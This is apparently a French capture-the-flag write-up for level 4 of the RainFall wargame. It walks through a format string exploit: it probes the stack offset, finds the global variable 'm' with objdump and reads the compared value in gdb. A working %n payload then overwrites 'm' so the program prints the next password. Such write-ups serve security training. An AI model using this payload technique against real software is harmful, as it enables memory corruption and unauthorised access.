# Level 4

Dans ce programme nous voyons 2 fonctions, n() et p()
La fonction p() fait un appel a printf de maniere non securise, nous allons donc l'exploiter pour ecraser la valeur de la variable globale "m". Car la valeur de m est ensuite verifie dans une condition if pour nous afficher le .pass avec un appel a system et /bin/cat.

Nous allons d'abord chercher l'offset sur lequel ce printf ecrase la memoire:

```
level4@RainFall:~$ python -c 'print("AAAA" + "%08x." * 24)' | ./level4 | grep 41
AAAAb7ff26b0.bffff794.b7fd0ff4.00000000.00000000.bffff758.0804848d.bffff550.00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
```

Nous trouvons que c'est sur le 12eme octet.
Nous pouvons le verifier ainsi:

```
level4@RainFall:~$ python -c 'print("AAAA%12$p")' | ./level4
AAAA0x41414141
```

Nous cherchons ensuite l'adresse de la globale m

```
level4@RainFall:~$ objdump -t ./level4 | grep m
./level4:     file format elf32-i386
080481b0 l    d  .dynsym	00000000              .dynsym
080485b4 l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
080485f8 l    d  .eh_frame	00000000              .eh_frame
08049710 l    d  .dynamic	00000000              .dynamic
00000000 l    d  .comment	00000000              .comment
08049808 l     O .bss	00000001              completed.6159
08048420 l     F .text	00000000              frame_dummy
080486f8 l     O .eh_frame	00000000              __FRAME_END__
08049710 l     O .dynamic	00000000              _DYNAMIC
00000000       F *UND*	00000000              system@@GLIBC_2.0
00000000  w      *UND*	00000000              __gmon_start__
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
08049810 g     O .bss	00000004              m
080484a7 g     F .text	0000000d              main
```

La derniere a faire est de trouver la valeur a mettre dans la globale m,
nous le faisons avec gdb:

```
level4@RainFall:~$ gdb ./level4
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) disass n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   **0x08048492 <+59>:	cmp    $0x1025544,%eax**
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
```

Finalement nous procedons a l'injection.
Le format "%Nd" remplace le `N` par un chiffre, ce qui nous permet de ne pas mettre les `N` octets nécessaires (Remplacer `"B" * 64` par `"%64d`)

```
$ (python -c 'print "\x10\x98\x04\x08"+"%"+str(0x1025540)+"d%12$n"') | ./level4
```

And we get the .pass !
